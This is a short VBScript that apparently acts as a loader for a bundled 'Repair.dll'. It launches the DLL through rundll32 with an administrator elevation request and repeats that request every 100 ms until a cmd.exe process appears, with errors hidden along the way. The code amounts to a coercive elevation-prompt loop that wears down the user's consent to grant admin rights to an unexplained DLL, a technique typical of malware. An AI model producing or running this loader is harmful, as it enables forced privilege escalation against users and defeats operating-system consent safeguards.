Option Explicit

Dim objFSO, objShell, objWMIService
Dim strScriptPath, strDllPath
Dim colProcesses, objProcess

On Error Resume Next

Set objFSO = CreateObject("Scripting.FileSystemObject")
If Err.Number <> 0 Then WScript.Quit 1

Set objShell = CreateObject("Shell.Application")
If Err.Number <> 0 Then WScript.Quit 1

Set objWMIService = GetObject("winmgmts:\\.\root\CIMV2")
If Err.Number <> 0 Then WScript.Quit 1

On Error GoTo 0

strScriptPath = objFSO.GetParentFolderName(WScript.ScriptFullName)
strDllPath = objFSO.BuildPath(strScriptPath, "Repair.dll")

If Not objFSO.FileExists(strDllPath) Then WScript.Quit 1

Do
    On Error Resume Next
    objShell.ShellExecute "rundll32.exe", Chr(34) & strDllPath & Chr(34) & ",Repair", strScriptPath, "runas", 1
    If Err.Number <> 0 Then Exit Do
    On Error GoTo 0
    
    WScript.Sleep 100
    
    On Error Resume Next
    Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='cmd.exe'")
    
    If Err.Number = 0 Then
        For Each objProcess in colProcesses
            Exit Do
        Next
    End If
    
    On Error GoTo 0
Loop


Set objFSO = Nothing
Set objShell = Nothing
Set objWMIService = Nothing
Set colProcesses = Nothing
